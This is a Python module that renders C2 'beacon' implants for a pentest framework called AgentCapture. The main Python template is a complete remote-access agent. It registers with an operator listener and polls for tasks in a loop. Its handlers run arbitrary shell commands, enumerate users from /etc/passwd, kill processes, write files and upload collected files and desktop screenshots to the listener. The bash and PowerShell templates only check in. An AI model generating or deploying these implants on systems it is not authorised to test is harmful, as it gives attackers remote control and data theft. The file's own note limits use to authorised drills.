"""Managed-agent beacon template renderer.

Ports the HTTP agent-contract templates from PentestManusWeb
``system/beacon_generator.py`` (AGPL-3.0-only), rebranded for AgentCapture.
The python template is the full executor (9 ops via ``/api/agent-control/*``);
bash/powershell are lease-and-progress placeholders that surface the session
in the console without executing on the host.

Generated artifacts are delivered payloads -- never run them locally.
"""

from __future__ import annotations

import json
import secrets
import shlex
from dataclasses import dataclass, field
from typing import Any


@dataclass
class ManagedBeaconBuild:
    code: str
    filename: str
    metadata: dict[str, Any] = field(default_factory=dict)
    safety_notes: list[str] = field(default_factory=list)


_PYTHON_AGENT_CONTRACT_BODY = r"""session_key = os.environ.get('AC_SESSION_KEY', '')

def post_json(path, payload):
    body = json.dumps(payload, separators=(',', ':')).encode()
    request = urllib.request.Request(BASE_URL + path, data=body, method='POST', headers=HEADERS)
    with urllib.request.urlopen(request, timeout=30) as response:
        raw = response.read().decode()
    return json.loads(raw) if raw else {}

def _collect_internal_ips():
    ips = []
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        probe.connect(('8.8.8.8', 80))
        ips.append(probe.getsockname()[0])
        probe.close()
    except OSError:
        pass
    system = platform.system().lower()
    if system == 'windows':
        commands = [['ipconfig']]
    elif system == 'darwin':
        commands = [['ifconfig']]
    else:
        commands = [['ip', '-o', '-4', 'addr', 'show'], ['ifconfig']]
    for command in commands:
        if shutil.which(command[0]) is None:
            continue
        try:
            output = subprocess.check_output(command, timeout=10, stderr=subprocess.STDOUT).decode('utf-8', 'replace')
        except Exception:
            continue
        for match in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', output):
            if match.startswith('127.') or match.endswith('.255') or match in ('0.0.0.0',):
                continue
            ips.append(match)
        if ips:
            break
    unique = []
    for item in ips:
        if item not in unique:
            unique.append(item)
    return unique[:20]

INTERNAL_IPS = _collect_internal_ips()

def register_agent():
    host_name = socket.gethostname() or 'agentcapture-host'
    payload = {
        'listenerId': LISTENER_ID,
        'registrationToken': REGISTRATION_TOKEN,
        'hostUid': os.environ.get('AC_HOST_UID') or 'ac-' + host_name,
        'displayName': host_name,
        'hostname': host_name,
        'platform': platform.system().lower() or 'unknown',
        'architecture': platform.machine() or 'unknown',
        'osVersion': (platform.system() + ' ' + platform.release()).strip() or None,
        'username': getpass.getuser(),
        'internalIps': INTERNAL_IPS,
        'capabilities': {
            'managedAgent': True,
            'command-execution': {'actions': ['command_run', 'process_inspect', 'process_kill', 'user_list']},
            'file-collection': {'actions': ['file_list', 'file_collect', 'file_write']},
            'network-operations': {'actions': ['network_inspect']},
            'host-interaction': {'actions': ['screenshot']},
        },
        'metadata': {'template': 'agentcapture-agent-contract', 'runtime': 'python', 'executor': 'builtin-ops-v2'},
    }
    data = post_json('/api/agent-control/register', payload)
    return (data.get('session') or {}).get('sessionKey') or ''

def _to_int(value, default=None):
    try:
        return int(value)
    except (TypeError, ValueError):
        return default

def _op_command_run(task, args, ctx):
    command = str(task.get('commandText') or args.get('commandText') or '').strip()
    if not command:
        raise ValueError('commandText is empty')
    cwd = args.get('workingDirectory') or args.get('cwd') or None
    timeout = _to_int(args.get('timeoutSeconds'), 60) or 60
    timeout = max(1, min(timeout, 600))
    started = time.time()
    proc = subprocess.Popen(command, shell=True, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    timed_out = False
    try:
        out, err = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        timed_out = True
        proc.kill()
        out, err = proc.communicate()
    stdout = out.decode('utf-8', 'replace') if isinstance(out, bytes) else str(out or '')
    stderr = err.decode('utf-8', 'replace') if isinstance(err, bytes) else str(err or '')
    first_line = (stdout.strip().splitlines() or [''])[0][:120]
    payload = {'commandRunResult': {
        'commandText': command,
        'status': 'failed' if timed_out else 'success',
        'success': not timed_out,
        'exitCode': proc.returncode,
        'stdout': stdout[-60000:],
        'stderr': stderr[-20000:],
        'durationMs': int((time.time() - started) * 1000),
        'failureReason': ('command timed out after %ss' % timeout) if timed_out else None,
    }}
    return payload, 'exit=%s %s' % (proc.returncode, first_line)

def _op_process_inspect(task, args, ctx):
    processes = []
    if platform.system().lower() == 'windows':
        output = subprocess.check_output(['tasklist', '/v', '/fo', 'csv'], timeout=30).decode('utf-8', 'replace')
        rows = [row for row in csv.reader(output.splitlines())]
        header = [cell.strip().lower() for cell in rows[0]] if rows else []
        for row in rows[1:]:
            item = dict(zip(header, row))
            processes.append({'pid': _to_int(item.get('pid')), 'parentPid': None, 'name': item.get('image name'), 'user': item.get('user name'), 'commandLine': item.get('image name'), 'startTime': None, 'metadata': {}})
    else:
        output = subprocess.check_output(['ps', '-eo', 'pid=,ppid=,user=,comm=,args='], timeout=30).decode('utf-8', 'replace')
        for line in output.splitlines():
            parts = line.split(None, 4)
            if len(parts) < 5:
                continue
            processes.append({'pid': _to_int(parts[0]), 'parentPid': _to_int(parts[1]), 'name': parts[3], 'user': parts[2], 'commandLine': parts[4][:400], 'startTime': None, 'metadata': {}})
    payload = {'processInspectResult': {'processes': processes, 'processCount': len(processes), 'success': True, 'status': 'success'}}
    return payload, 'enumerated %d processes' % len(processes)

def _op_process_kill(task, args, ctx):
    pid = _to_int(args.get('pid'))
    if not pid or pid <= 0:
        raise ValueError('invalid pid')
    sig = _to_int(args.get('signal'), 15) or 15
    if platform.system().lower() == 'windows':
        command = ['taskkill', '/PID', str(pid)] + (['/F'] if sig == 9 else [])
        output = subprocess.check_output(command, timeout=15, stderr=subprocess.STDOUT).decode('utf-8', 'replace')
    else:
        os.kill(pid, sig)
        output = 'signal %d sent to pid %d' % (sig, pid)
    payload = {'processKillResult': {'pid': pid, 'signal': sig, 'success': True, 'status': 'success', 'output': output}}
    return payload, 'sent signal %d to pid %d' % (sig, pid)

def _op_file_list(task, args, ctx):
    path = str(args.get('path') or '').strip() or os.getcwd()
    path = os.path.abspath(path)
    entries = []
    with os.scandir(path) as iterator:
        for entry in iterator:
            full_path = os.path.join(path, entry.name)
            try:
                stat = entry.stat(follow_symlinks=False)
                size = stat.st_size
                modified = time.strftime('%Y-%m-%dT%H:%M:%S', time.localtime(stat.st_mtime))
            except OSError:
                size = None
                modified = None
            if entry.is_symlink():
                entry_type = 'link'
            elif entry.is_dir(follow_symlinks=False):
                entry_type = 'dir'
            else:
                entry_type = 'file'
            entries.append({'name': entry.name, 'path': full_path, 'type': entry_type, 'sizeBytes': size, 'modifiedAt': modified, 'readable': os.access(full_path, os.R_OK), 'writable': os.access(full_path, os.W_OK)})
    entries.sort(key=lambda item: (item['type'] != 'dir', str(item['name']).lower()))
    payload = {'fileListResult': {'path': path, 'entries': entries[:2000], 'entryCount': len(entries), 'success': True, 'status': 'success'}}
    return payload, 'listed %d entries under %s' % (len(entries), path)

def _op_file_collect(task, args, ctx):
    paths = args.get('paths') or []
    if isinstance(paths, str):
        paths = [paths]
    if not paths and args.get('path'):
        paths = [args.get('path')]
    paths = [str(item).strip() for item in paths if str(item or '').strip()]
    if not paths:
        raise ValueError('paths is empty')
    max_bytes = _to_int(args.get('maxBytes'), 8 * 1024 * 1024) or (8 * 1024 * 1024)
    max_bytes = max(1024, min(max_bytes, 64 * 1024 * 1024))
    artifacts = []
    errors = []
    for path in paths[:20]:
        try:
            size = os.path.getsize(path)
            with open(path, 'rb') as handle:
                blob = handle.read(max_bytes + 1)
            truncated = len(blob) > max_bytes
            blob = blob[:max_bytes]
            digest = hashlib.sha256(blob).hexdigest()
            try:
                preview = blob[:4000].decode('utf-8')
            except UnicodeDecodeError:
                preview = ''
            evidence = post_json('/api/agent-control/tasks/%d/evidence' % ctx['taskId'], {
                'sessionKey': session_key,
                'leaseToken': ctx['leaseToken'],
                'evidenceType': 'file',
                'title': 'file: ' + path,
                'contentText': preview or None,
                'payload': {'path': path, 'sha256': digest, 'sizeBytes': size, 'truncated': truncated, 'encoding': 'base64', 'fileBase64': base64.b64encode(blob).decode()},
            })
            artifacts.append({'path': path, 'sha256': digest, 'sizeBytes': size, 'truncated': truncated, 'evidenceId': (evidence.get('evidence') or {}).get('id')})
        except OSError as exc:
            errors.append({'path': path, 'error': str(exc)})
    if not artifacts and errors:
        raise RuntimeError('collect failed: ' + '; '.join('%s: %s' % (item['path'], item['error']) for item in errors))
    payload = {'fileCollectResult': {'artifacts': artifacts, 'errors': errors, 'artifactCount': len(artifacts), 'success': True, 'status': 'success'}}
    return payload, 'collected %d file(s), %d error(s)' % (len(artifacts), len(errors))

def _op_file_write(task, args, ctx):
    path = str(args.get('path') or '').strip()
    if not path:
        raise ValueError('path is empty')
    if args.get('contentBase64'):
        blob = base64.b64decode(str(args.get('contentBase64')))
    else:
        blob = str(args.get('content') or '').encode('utf-8')
    parent = os.path.dirname(os.path.abspath(path))
    if parent and not os.path.isdir(parent):
        os.makedirs(parent, exist_ok=True)
    with open(path, 'wb') as handle:
        handle.write(blob)
    digest = hashlib.sha256(blob).hexdigest()
    payload = {'fileWriteResult': {'path': path, 'sizeBytes': len(blob), 'sha256': digest, 'success': True, 'status': 'success'}}
    return payload, 'wrote %d bytes to %s' % (len(blob), path)

def _op_user_list(task, args, ctx):
    system = platform.system().lower()
    users = []
    current_user = ''
    if system == 'windows':
        current_user = os.environ.get('USERNAME') or ''
        try:
            output = subprocess.check_output(['powershell', '-NoProfile', '-Command', 'Get-LocalUser | Select-Object Name,Enabled,SID | ConvertTo-Json -Compress'], timeout=30).decode('utf-8', 'replace')
            parsed = json.loads(output) if output.strip() else []
            if isinstance(parsed, dict):
                parsed = [parsed]
            for item in parsed:
                users.append({'username': item.get('Name'), 'uid': None, 'gid': None, 'home': None, 'shell': None, 'groups': [], 'metadata': {'enabled': item.get('Enabled'), 'sid': item.get('SID')}})
        except Exception:
            output = subprocess.check_output(['net', 'user'], timeout=30).decode('utf-8', 'replace')
            for name in output.split():
                users.append({'username': name, 'uid': None, 'gid': None, 'home': None, 'shell': None, 'groups': [], 'metadata': {'source': 'net-user-raw'}})
    else:
        seen = set()
        try:
            with open('/etc/passwd', 'r') as handle:
                for line in handle:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split(':')
                    if len(parts) < 7 or parts[0] in seen:
                        continue
                    seen.add(parts[0])
                    users.append({'username': parts[0], 'uid': _to_int(parts[2]), 'gid': _to_int(parts[3]), 'home': parts[5], 'shell': parts[6], 'groups': [], 'metadata': {'gecos': parts[4]}})
        except OSError:
            pass
        if system == 'darwin':
            try:
                output = subprocess.check_output(['dscl', '.', 'list', '/Users'], timeout=15).decode('utf-8', 'replace')
                for name in output.split():
                    if name not in seen and not name.startswith('_'):
                        seen.add(name)
                        users.append({'username': name, 'uid': None, 'gid': None, 'home': None, 'shell': None, 'groups': [], 'metadata': {'source': 'dscl'}})
            except Exception:
                pass
        groups_by_user = {}
        try:
            with open('/etc/group', 'r') as handle:
                for line in handle:
                    parts = line.strip().split(':')
                    if len(parts) < 4:
                        continue
                    for member in parts[3].split(','):
                        member = member.strip()
                        if member:
                            groups_by_user.setdefault(member, []).append(parts[0])
        except OSError:
            pass
        for user in users:
            user['groups'] = groups_by_user.get(user['username'], [])
        try:
            current_user = subprocess.check_output(['id', '-un'], timeout=10).decode('utf-8', 'replace').strip()
        except Exception:
            current_user = ''
    payload = {'userListResult': {'users': users, 'userCount': len(users), 'currentUser': current_user, 'success': True, 'status': 'success'}}
    return payload, 'enumerated %d users' % len(users)

def _op_screenshot(task, args, ctx):
    system = platform.system().lower()
    fd, tmp_path = tempfile.mkstemp(suffix='.png', prefix='ac-shot-')
    os.close(fd)
    os.unlink(tmp_path)
    tool = None
    if system == 'darwin':
        candidates = [(['screencapture', '-x', tmp_path], 'screencapture')]
    elif system == 'windows':
        ps_script = "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $bmp.Save('%s',[System.Drawing.Imaging.ImageFormat]::Png)" % tmp_path.replace('\\', '\\\\')
        candidates = [(['powershell', '-NoProfile', '-Command', ps_script], 'powershell-screen-capture')]
    else:
        candidates = [(['scrot', tmp_path], 'scrot'), (['import', '-window', 'root', tmp_path], 'imagemagick-import'), (['gnome-screenshot', '-f', tmp_path], 'gnome-screenshot')]
    for command, name in candidates:
        if shutil.which(command[0]) is None:
            continue
        try:
            subprocess.check_output(command, timeout=30, stderr=subprocess.STDOUT)
        except Exception:
            continue
        if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 0:
            tool = name
            break
    if not tool:
        raise RuntimeError('screenshot unsupported: no capture tool available or no active desktop session')
    with open(tmp_path, 'rb') as handle:
        blob = handle.read()
    try:
        os.unlink(tmp_path)
    except OSError:
        pass
    evidence = post_json('/api/agent-control/tasks/%d/evidence' % ctx['taskId'], {
        'sessionKey': session_key,
        'leaseToken': ctx['leaseToken'],
        'evidenceType': 'screenshot',
        'title': 'desktop screenshot',
        'payload': {'imageBase64': base64.b64encode(blob).decode(), 'format': 'png', 'tool': tool, 'sizeBytes': len(blob), 'capturedAt': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())},
    })
    evidence_id = (evidence.get('evidence') or {}).get('id')
    payload = {'screenshotResult': {'captured': True, 'success': True, 'status': 'success', 'tool': tool, 'sizeBytes': len(blob), 'evidenceId': evidence_id}}
    return payload, 'screenshot captured via %s (%d bytes)' % (tool, len(blob))

def _op_network_inspect(task, args, ctx):
    targets = args.get('targets') or []
    if isinstance(targets, dict):
        targets = [targets]
    results = []
    for target in targets[:50]:
        host = str((target or {}).get('host') or '').strip()
        port = _to_int((target or {}).get('port'))
        if not host or not port:
            continue
        started = time.time()
        reachable = False
        error = None
        try:
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
            reachable = True
        except OSError as exc:
            error = str(exc)
        results.append({'host': host, 'port': port, 'reachable': reachable, 'latencyMs': int((time.time() - started) * 1000), 'error': error})
    reachable_count = sum(1 for item in results if item['reachable'])
    payload = {'networkInspectResult': {'results': results, 'targetCount': len(results), 'reachableCount': reachable_count, 'success': True, 'status': 'success'}}
    return payload, 'probed %d targets, %d reachable' % (len(results), reachable_count)

OP_HANDLERS = {
    'command_run': _op_command_run,
    'process_inspect': _op_process_inspect,
    'process_kill': _op_process_kill,
    'file_list': _op_file_list,
    'file_collect': _op_file_collect,
    'file_write': _op_file_write,
    'user_list': _op_user_list,
    'screenshot': _op_screenshot,
    'network_inspect': _op_network_inspect,
}

sleep_seconds = SLEEP_SECONDS

def _apply_beacon_interval(response):
    global sleep_seconds
    host = (response or {}).get('host') or {}
    metadata = host.get('metadata') or {}
    interval = _to_int(metadata.get('beaconIntervalSeconds'))
    if interval:
        sleep_seconds = max(1, interval)

def execute_task(task):
    task_id = _to_int(task.get('taskId') or task.get('id'))
    lease_token = task.get('leaseToken') or ''
    if not task_id or not lease_token:
        return
    ctx = {'taskId': task_id, 'leaseToken': lease_token}
    post_json('/api/agent-control/tasks/%d/heartbeat' % task_id, {'sessionKey': session_key, 'leaseToken': lease_token})
    task_type = str(task.get('taskType') or '').strip().lower()
    args = task.get('arguments')
    if not isinstance(args, dict):
        args = {}
    handler = OP_HANDLERS.get(task_type)
    if handler is None:
        post_json('/api/agent-control/tasks/%d/fail' % task_id, {'sessionKey': session_key, 'leaseToken': lease_token, 'message': 'unsupported taskType: %s' % (task_type or 'unknown'), 'payload': {}})
        return
    post_json('/api/agent-control/tasks/%d/progress' % task_id, {'sessionKey': session_key, 'leaseToken': lease_token, 'summary': 'executing %s' % task_type})
    try:
        payload, summary = handler(task, args, ctx)
    except Exception as exc:
        post_json('/api/agent-control/tasks/%d/fail' % task_id, {'sessionKey': session_key, 'leaseToken': lease_token, 'message': '%s failed: %s' % (task_type, exc), 'payload': {}})
        return
    post_json('/api/agent-control/tasks/%d/complete' % task_id, {'sessionKey': session_key, 'leaseToken': lease_token, 'resultSummary': summary, 'payload': payload})

import tempfile as _tf
_STATE_FILE = os.path.join(_tf.gettempdir(), 'ac-beacon-' + __import__('hashlib').sha1((BASE_URL + '|' + str(LISTENER_ID)).encode()).hexdigest()[:12] + '.state')
try:
    with open(_STATE_FILE) as _f:
        session_key = _f.read().strip() or None
except OSError:
    session_key = None
while True:
    try:
        if not session_key:
            session_key = register_agent()
            try:
                with open(_STATE_FILE, 'w') as _f:
                    _f.write(session_key)
            except OSError:
                pass
        checkin = post_json('/api/agent-control/checkin', {'sessionKey': session_key, 'capabilities': {'managedAgent': True}, 'internalIps': INTERNAL_IPS, 'metadata': {'template': 'agentcapture-agent-contract', 'executor': 'builtin-ops-v2'}})
        _apply_beacon_interval(checkin)
        lease = post_json('/api/agent-control/tasks/lease', {'sessionKey': session_key})
        task = lease.get('task') or {}
        if task:
            execute_task(task)
    except urllib.error.HTTPError as _http_err:
        if _http_err.code in (401, 403, 404):
            session_key = None
            try:
                os.remove(_STATE_FILE)
            except OSError:
                pass
    except (urllib.error.URLError, TimeoutError, ValueError, OSError):
        pass
    time.sleep(sleep_seconds)
"""


def _clean_text(value: Any, default: str = "", max_length: int = 200) -> str:
    if value is None:
        return default
    text = str(value).strip()
    return (text or default)[:max_length]


def _clean_int(value: Any, default: int, minimum: int, maximum: int) -> int:
    try:
        number = int(value)
    except (TypeError, ValueError):
        number = default
    return max(minimum, min(number, maximum))


def _render_python_agent_contract(params: dict[str, Any]) -> str:
    scheme = params["scheme"]
    base_url = f"{scheme}://{params['targetHost']}:{params['targetPort']}"
    headers = {"Content-Type": "application/json", "X-Client-Beacon": "true"}
    return (
        "import base64, csv, getpass, hashlib, json, os, platform, re, shutil, socket, subprocess, tempfile, time, urllib.error, urllib.request\n"
        f"BASE_URL = {base_url!r}\n"
        f"SLEEP_SECONDS = {params['sleepSeconds']}\n"
        f"LISTENER_ID = {params['listenerId']}\n"
        f"REGISTRATION_TOKEN = {params['registrationToken']!r}\n"
        f"HEADERS = {headers!r}\n" + _PYTHON_AGENT_CONTRACT_BODY
    )


def _render_bash_agent_contract(params: dict[str, Any]) -> str:
    base_url = f"{params['scheme']}://{params['targetHost']}:{params['targetPort']}"
    headers = "-H 'Content-Type: application/json' -H 'X-Client-Beacon: true'"
    register_payload = json.dumps(
        {
            "listenerId": params["listenerId"],
            "registrationToken": params["registrationToken"],
            "hostUid": "${HOST_UID}",
            "displayName": "${HOST_NAME}",
            "hostname": "${HOST_NAME}",
            "platform": "linux",
            "architecture": "$(uname -m 2>/dev/null || printf unknown)",
            "capabilities": {
                "managedAgent": True,
                "command-execution": {"actions": ["command_run", "process_inspect"]},
                "file-collection": {"actions": ["file_collect"]},
                "network-operations": {"actions": ["network_inspect"]},
            },
            "metadata": {"template": "agentcapture-agent-contract", "runtime": "bash"},
        }
    )
    return (
        "#!/usr/bin/env bash\nset -eu\n"
        "HOST_NAME=$(hostname 2>/dev/null || printf agentcapture-host)\n"
        "HOST_UID=${AC_HOST_UID:-ac-${HOST_NAME}}\n"
        f"BASE_URL={shlex.quote(base_url)}\n"
        f"SLEEP_SECONDS={params['sleepSeconds']}\n"
        "SESSION_KEY=${AC_SESSION_KEY:-}\n"
        "register_agent() {\n"
        f"  response=$(curl -fsS -X POST \"$BASE_URL/api/agent-control/register\"{headers} -d '{register_payload}')\n"
        '  SESSION_KEY=$(printf \'%s\' "$response" | python3 -c \'import json,sys; print((json.load(sys.stdin).get("session") or {}).get("sessionKey") or "")\')\n'
        '  export AC_SESSION_KEY="$SESSION_KEY"\n'
        "}\n"
        f'post_json() {{ curl -fsS -X POST "$BASE_URL$1"{headers} -d "$2"; }}\n'
        '[ -n "$SESSION_KEY" ] || register_agent\n'
        "while true; do\n"
        '  post_json /api/agent-control/checkin "{\\"sessionKey\\":\\"$SESSION_KEY\\",\\"capabilities\\":{\\"managedAgent\\":true},\\"metadata\\":{\\"template\\":\\"agentcapture-agent-contract\\"}}" >/dev/null || true\n'
        '  lease=$(post_json /api/agent-control/tasks/lease "{\\"sessionKey\\":\\"$SESSION_KEY\\"}" || true)\n'
        '  task_id=$(printf \'%s\' "$lease" | python3 -c \'import json,sys; data=json.load(sys.stdin); print((((data.get("task") or {}).get("taskId")) or ""))\' 2>/dev/null || true)\n'
        '  lease_token=$(printf \'%s\' "$lease" | python3 -c \'import json,sys; data=json.load(sys.stdin); print((((data.get("task") or {}).get("leaseToken")) or ""))\' 2>/dev/null || true)\n'
        '  if [ -n "$task_id" ] && [ -n "$lease_token" ]; then\n'
        '    post_json "/api/agent-control/tasks/$task_id/heartbeat" "{\\"sessionKey\\":\\"$SESSION_KEY\\",\\"leaseToken\\":\\"$lease_token\\"}" >/dev/null || true\n'
        '    post_json "/api/agent-control/tasks/$task_id/progress" "{\\"sessionKey\\":\\"$SESSION_KEY\\",\\"leaseToken\\":\\"$lease_token\\",\\"summary\\":\\"Task leased; awaiting approved executor attachment.\\"}" >/dev/null || true\n'
        "  fi\n"
        '  sleep "$SLEEP_SECONDS"\n'
        "done\n"
    )


def _render_powershell_agent_contract(params: dict[str, Any]) -> str:
    base_url = f"{params['scheme']}://{params['targetHost']}:{params['targetPort']}"
    token = params["registrationToken"].replace("'", "''")
    return (
        f"$BaseUrl='{base_url}'\n"
        f"$SleepSeconds={params['sleepSeconds']}\n"
        f"$ListenerId={params['listenerId']}\n"
        f"$RegistrationToken='{token}'\n"
        "$Headers=@{ 'Content-Type'='application/json'; 'X-Client-Beacon'='true' }\n"
        "$SessionKey=$env:AC_SESSION_KEY\n"
        "function Post-Json($Path, $Payload) {\n"
        "  $Body = $Payload | ConvertTo-Json -Depth 8 -Compress\n"
        "  Invoke-RestMethod -Uri \"$BaseUrl$Path\" -Method Post -Headers $Headers -Body $Body -ContentType 'application/json'\n"
        "}\n"
        "function Register-Agent {\n"
        "  $HostName = $env:COMPUTERNAME\n"
        "  if ([string]::IsNullOrWhiteSpace($HostName)) { $HostName = [System.Net.Dns]::GetHostName() }\n"
        '  $HostUid = if ([string]::IsNullOrWhiteSpace($env:AC_HOST_UID)) { "ac-$HostName" } else { $env:AC_HOST_UID }\n'
        "  $Payload = @{ listenerId=$ListenerId; registrationToken=$RegistrationToken; hostUid=$HostUid; displayName=$HostName; hostname=$HostName; platform='windows'; architecture=$env:PROCESSOR_ARCHITECTURE; capabilities=@{ managedAgent=$true; 'command-execution'=@{ actions=@('command_run','process_inspect') }; 'file-collection'=@{ actions=@('file_collect') }; 'network-operations'=@{ actions=@('network_inspect') } }; metadata=@{ template='agentcapture-agent-contract'; runtime='powershell' } }\n"
        "  $Response = Post-Json '/api/agent-control/register' $Payload\n"
        "  $script:SessionKey = $Response.session.sessionKey\n"
        "  $env:AC_SESSION_KEY = $script:SessionKey\n"
        "}\n"
        "if ([string]::IsNullOrWhiteSpace($SessionKey)) { Register-Agent }\n"
        "while ($true) {\n"
        "  try {\n"
        "    Post-Json '/api/agent-control/checkin' @{ sessionKey=$SessionKey; capabilities=@{ managedAgent=$true }; metadata=@{ template='agentcapture-agent-contract' } } | Out-Null\n"
        "    $Lease = Post-Json '/api/agent-control/tasks/lease' @{ sessionKey=$SessionKey }\n"
        "    $Task = $Lease.task\n"
        "    if ($Task -and $Task.taskId -and $Task.leaseToken) {\n"
        '      Post-Json "/api/agent-control/tasks/$($Task.taskId)/heartbeat" @{ sessionKey=$SessionKey; leaseToken=$Task.leaseToken } | Out-Null\n'
        "      Post-Json \"/api/agent-control/tasks/$($Task.taskId)/progress\" @{ sessionKey=$SessionKey; leaseToken=$Task.leaseToken; summary='Task leased; awaiting approved executor attachment.' } | Out-Null\n"
        "    }\n"
        "  } catch {}\n"
        "  Start-Sleep -Seconds $SleepSeconds\n"
        "}\n"
    )


def generate_managed_beacon(payload: dict[str, Any]) -> ManagedBeaconBuild:
    """Render a managed-agent beacon script bound to a managed listener."""
    runtime = _clean_text(payload.get("runtimeType"), default="python", max_length=16).lower()
    if runtime not in {"python", "bash", "powershell"}:
        runtime = "python"
    scheme = _clean_text(payload.get("scheme"), default="http", max_length=8).lower()
    if scheme not in {"http", "https"}:
        scheme = "http"
    params = {
        "runtimeType": runtime,
        "scheme": scheme,
        "targetHost": _clean_text(payload.get("targetHost"), default="127.0.0.1"),
        "targetPort": _clean_int(payload.get("targetPort"), default=8443, minimum=1, maximum=65535),
        "sleepSeconds": _clean_int(payload.get("sleepSeconds"), default=5, minimum=1, maximum=3600),
        "listenerId": _clean_int(
            payload.get("listenerId"), default=0, minimum=0, maximum=2147483647
        ),
        "registrationToken": _clean_text(payload.get("registrationToken"), max_length=400),
    }
    renderers = {
        "python": _render_python_agent_contract,
        "bash": _render_bash_agent_contract,
        "powershell": _render_powershell_agent_contract,
    }
    code = renderers[runtime](params)
    ext = {"python": "py", "bash": "sh", "powershell": "ps1"}[runtime]
    return ManagedBeaconBuild(
        code=code,
        filename=f"beacon-managed-{runtime}.{ext}",
        metadata={
            "runtimeType": runtime,
            "listenerId": params["listenerId"],
            "targetHost": params["targetHost"],
            "targetPort": params["targetPort"],
            "artifactHash": secrets.token_hex(8),
        },
        safety_notes=[
            "仅用于授权演练环境；python 模板内置 9 类操作执行体，bash/powershell 仅租约占位。",
        ],
    )
